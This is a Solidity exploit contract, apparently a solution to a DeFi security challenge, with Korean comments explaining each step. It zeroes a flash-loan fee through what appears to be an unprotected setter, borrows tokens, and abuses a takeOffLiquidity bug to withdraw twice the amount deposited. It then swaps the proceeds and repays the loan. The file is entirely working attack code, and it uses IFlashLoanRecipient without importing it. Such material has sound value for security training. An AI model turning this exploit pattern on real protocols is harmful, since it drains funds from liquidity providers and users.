//SPDX-license-Identifier: MIT
pragma solidity ^0.8.20;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IUniswapV2Pair} from "./uniswap-v2/interfaces/IUniswapV2Pair.sol";
import {LamboToken} from "./core/LamboToken.sol";
import {VasthavikamainaToken} from "./core/VasthavikamainaToken.sol";
import {Balancer} from "./core/Balancer.sol";
import {WhiteListed} from "./core/WhiteListed.sol";

contract AttackContract is IFlashLoanRecipient {
    Balancer balancer;
    WhiteListed whiteListed;
    VasthavikamainaToken VSTETH;
    
    // 공격할 토큰들의 정보를 저장
    struct TokenInfo {
        LamboToken token;
        IUniswapV2Pair pair;
        uint256 amount;
    }
    TokenInfo[] public targets;
    
    constructor(
        address _balancer,
        address _whiteListed,
        address _VSTETH,
        address[] memory _tokens,
        address[] memory _pairs,
        uint256[] memory _amounts
    ) {
        balancer = Balancer(_balancer);
        whiteListed = WhiteListed(_whiteListed);
        VSTETH = VasthavikamainaToken(_VSTETH);
        
        // 타겟 토큰 정보 초기화
        for(uint i = 0; i < _tokens.length; i++) {
            targets.push(TokenInfo(
                LamboToken(_tokens[i]),
                IUniswapV2Pair(_pairs[i]),
                _amounts[i]
            ));
        }
    }
    
    function attack() external {
        // 1. 먼저 수수료를 0으로 설정
        balancer.setflashFee(0);
        
        // 2. 모든 토큰에 대해 flashloan 실행
        IERC20[] memory tokens = new IERC20[](targets.length);
        uint256[] memory amounts = new uint256[](targets.length);
        
        for(uint i = 0; i < targets.length; i++) {
            tokens[i] = IERC20(address(targets[i].token));
            amounts[i] = targets[i].amount;
        }
        
        balancer.flashloan(this, tokens, amounts, "");
    }
    
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory,
        bytes memory
    ) external override {
        for(uint i = 0; i < tokens.length; i++) {
            address token = address(tokens[i]);
            
            // 1. provideLiquidity 호출
            balancer.provideLiquidity(token, amounts[i]);
            
            // 2. takeOffLiquidity의 취약점을 이용해 2배 인출
            balancer.takeOffLiquidity(token, amounts[i] * 2);
            
            // 3. 인출한 토큰을 VSTETH로 교환
            whiteListed.sellQuote(token, amounts[i], 0);
        }
        
        // 4. flashloan 상환
        for(uint i = 0; i < tokens.length; i++) {
            tokens[i].transfer(address(balancer), amounts[i]);
        }
    }
    
    receive() external payable {}
}